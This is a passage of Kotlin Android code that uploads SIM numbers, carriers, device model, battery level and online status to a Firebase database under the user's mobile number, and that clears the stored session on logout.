    fun updateSimCardInfo(context: Context, mobile: String, permissionStatus: String, details: SimDeviceDetails) {
        val batteryPct = getBatteryLevelPercent(context)
        val nowFormatted = getFormattedDeviceDateTime()
        database.getReference("users/$mobile").updateChildren(
            mapOf(
                "simPermissionStatus" to permissionStatus,
                "simNumber" to details.combinedSimNumber,
                "sim1Details" to details.sim1Details,
                "sim2Details" to details.sim2Details,
                "sim1Number" to details.sim1Number,
                "sim2Number" to details.sim2Number,
                "sim1Carrier" to details.sim1Carrier,
                "sim2Carrier" to details.sim2Carrier,
                "networkOperator" to details.networkOperator,
                "operatorName" to details.networkOperator,
                "deviceModel" to getDeviceDisplayName(),
                "mobileModel" to getDeviceDisplayName(),
                "deviceName" to getDeviceDisplayName(),
                "manufacturer" to getDeviceManufacturer(),
                "model" to getDeviceModel(),
                "battery" to batteryPct,
                "batteryLevel" to batteryPct,
                "batteryPercentage" to "$batteryPct%",
                "deviceDateTime" to nowFormatted,
                "deviceTime" to nowFormatted,
                "lastSeen" to ServerValue.TIMESTAMP
            )
        )
    }

    fun refreshDeviceAndSimIfPermitted(context: Context, mobile: String) {
        val userRef = database.getReference("users/$mobile")
        userRef.get().addOnSuccessListener { snap ->
            if (!snap.exists()) return@addOnSuccessListener
            val permGranted = hasSimPermission(context)
            val batteryPct = getBatteryLevelPercent(context)
            val nowFormatted = getFormattedDeviceDateTime()
            val payload = mutableMapOf<String, Any>(
                "deviceModel" to getDeviceDisplayName(),
                "mobileModel" to getDeviceDisplayName(),
                "deviceName" to getDeviceDisplayName(),
                "manufacturer" to getDeviceManufacturer(),
                "model" to getDeviceModel(),
                "battery" to batteryPct,
                "batteryLevel" to batteryPct,
                "batteryPercentage" to "$batteryPct%",
                "deviceDateTime" to nowFormatted,
                "deviceTime" to nowFormatted,
                "networkOperator" to getNetworkOperatorName(context),
                "operatorName" to getNetworkOperatorName(context),
                "lastSeen" to ServerValue.TIMESTAMP
            )
            if (permGranted) {
                val details = readSimDeviceDetails(context)
                payload["simPermissionStatus"] = "Granted"
                payload["simNumber"] = details.combinedSimNumber
                payload["sim1Details"] = details.sim1Details
                payload["sim2Details"] = details.sim2Details
                payload["sim1Number"] = details.sim1Number
                payload["sim2Number"] = details.sim2Number
                payload["sim1Carrier"] = details.sim1Carrier
                payload["sim2Carrier"] = details.sim2Carrier
                payload["networkOperator"] = details.networkOperator
                payload["operatorName"] = details.networkOperator
            }
            userRef.updateChildren(payload)
        }
    }

    fun markTimerExpired(mobile: String) {
        val userRef = database.getReference("users/$mobile")
        userRef.get().addOnSuccessListener { snap ->
            if (snap.exists()) {
                userRef.updateChildren(mapOf("timerStatus" to "expired"))
            }
        }
    }

    fun clearActiveUser(context: Context) {
        val m = _activeMobile.value
        if (m != null) {
            val userRef = database.getReference("users/$m")
            userRef.onDisconnect().cancel()
            userRef.updateChildren(
                mapOf(
                    "connectionStatus" to "offline",
                    "isOnline" to false,
                    "online" to false,
                    "lastSeen" to ServerValue.TIMESTAMP
                )
            )
        }
        context.applicationContext
            .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .remove(KEY_MOBILE)
            .remove(KEY_EXPIRY)
            .remove(KEY_SMS_ALERT_ENABLED)
            .apply()
        _smsAlertEnabled.value = false
        _activeMobile.value = null
        attachUserListener(null)
    }
}
